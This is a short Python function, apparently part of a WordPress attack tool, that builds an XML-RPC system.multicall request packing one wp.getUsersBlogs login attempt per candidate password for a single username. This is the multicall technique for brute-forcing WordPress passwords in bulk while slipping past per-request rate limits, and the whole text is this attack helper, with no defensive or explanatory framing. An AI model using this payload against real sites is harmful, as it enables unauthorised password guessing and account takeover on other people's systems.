def build_multicall_payload(username, passwords):
    calls = [{
        "methodName": "wp.getUsersBlogs",
        "params": [username, pwd]
    } for pwd in passwords]

    return {
        "methodCall": {
            "methodName": "system.multicall",
            "params": [calls]
        }
    }
